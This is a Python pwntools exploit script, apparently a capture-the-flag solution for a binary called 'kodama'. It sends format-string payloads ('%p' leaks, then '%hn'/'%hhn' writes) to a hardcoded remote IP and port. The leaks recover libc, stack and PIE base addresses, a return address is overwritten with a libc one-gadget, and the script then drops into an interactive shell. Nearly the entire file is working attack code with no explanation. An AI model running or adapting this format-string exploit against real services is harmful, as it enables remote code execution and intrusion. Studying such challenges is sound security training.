#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
from formatstring import *
import random
import subprocess

# Addr
libc_leak_offset = 0x1e3a23
gadgets = [0xdf735, 0xdf739, 0xdf73c]

# exploit
def Pwn():
 global io

 io.recvuntil('|__/\n\n')
 io.sendline('%p%p%p%p%p%14$p')

 libc_leak = int(io.recvn(14),0)
 libc_base = libc_leak - libc_leak_offset
 print(hex(libc_base))
 io.recvn(19)
 stack_leak = int(io.recvn(14),0)
 print(hex(stack_leak))
 io.recvn(5)
 pie_base = int(io.recvn(14),0) - 0x12f0 
 print(hex(pie_base))
 
 io.sendline(( f'%{0x8c}c%10$hhn'.ljust(0x10,'A').encode() + p64(stack_leak - 0x18) ).ljust(0x1e,b'A'))

 io.sendline( (f'%{ (libc_base + gadgets[1]) & 0xffff}c%10$hn'.ljust(0x10,'A').encode() + p64(stack_leak + 0x38) ).ljust(0x1e,b'A'))

 io.sendline(( f'%{0x8c}c%10$hhn'.ljust(0x10,'A').encode() + p64(stack_leak - 0x18)).ljust(0x1e,b'A'))

 io.sendline( (f'%{ ((libc_base + gadgets[1])&0xffffffff ) >> 16}c%10$hn'.ljust(0x10,'A').encode() + p64(stack_leak + 0x3a)).ljust(0x1e,b'A'))
 
 io.sendline( (f'%{0x8c}c%10$hhn'.ljust(0x10,'A').encode() + p64(stack_leak - 0x18)).ljust(0x1e,b'A'))

 io.sendline( (f'%{ (pie_base + 0x5000 )&0xffff}c%10$hn'.ljust(0x10,'A').encode() + p64(stack_leak + 0x30)).ljust(0x1e,b'A'))

 io.sendline(p64(0))

if __name__=='__main__':
# io = process('./kodama')
 io = remote('20.48.81.63',20002)

 Pwn()
 io.interactive()
